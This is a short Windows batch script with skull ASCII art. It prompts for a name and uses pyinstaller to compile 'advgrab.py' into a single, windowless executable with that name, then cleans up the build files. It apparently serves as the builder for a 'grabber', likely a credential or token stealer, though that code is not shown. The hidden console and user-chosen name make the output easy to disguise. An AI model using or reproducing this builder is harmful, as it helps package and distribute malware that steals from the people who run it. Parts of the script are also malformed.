@echo off
color 8
echo.
echo                                                          ;::::;                              
echo                                                        ;::::; :;                              
echo                                                      ;:::::'   :;                             
echo                                                     ;:::::;     ;.                           
echo                                                    ,:::::'  .  . ;           OOO\           
echo                                                    ::::::;       ;          OOOOO\            
echo                                                    ;:::::;       ;         OOOOOOOO           
echo                                                   ,;::::::;     ;'         / OOOOOOO          
echo                                                 ;:::::::::`. ,,,;.        /  / DOOOOOO        
echo                                               .';:::::::::::::::::;,     /  /     DOOOO     
echo                                              ,::::::;::::::;;;;::::;,   /  /        DOOO     
echo                                             ;`::::::`'::::::;;;::::: ,#/  /          DOOO   
echo                                             :`:::::::`;::::::;;::: ;::#  /            DOOO   
echo                                             ::`:::::::`;:::::::: ;::::# /              DOO   
echo                                             `:`:::::::`;:::::: ;::::::#/               DOO
echo                                              :::`:::::::`;; ;:::::::::##                OO
echo                                              ::::`:::::::`;::::::::;:::#                OO
echo                                              `:::::`::::::::::::;'`:;::#                O
echo                                               `:::::`::::::::;' /  / `:#
echo                                                ::::::`:::::;'  /  /   `#
set /p a="File Name?: "
if [%a%]==[] ( 
    CALL:error
    pause
    EXIT /B
) 
if [%a%] NEQ [] (
    CALL:main
    EXIT /B 1 
)
ECHO is on
:main
echo.
echo Name is: %a%
pyinstaller --clean --onefile --noconsole -i NONE -n %a% advgrab.py
rmdir /s /q __pycache__
rmdir /s /q build
del /f / s /q %a%.spec
echo.
echo Created: %a%.exe
EXIT /B 1 
ECHO is on
:error
echo.
echo Invaild Command...
EXIT /B 1
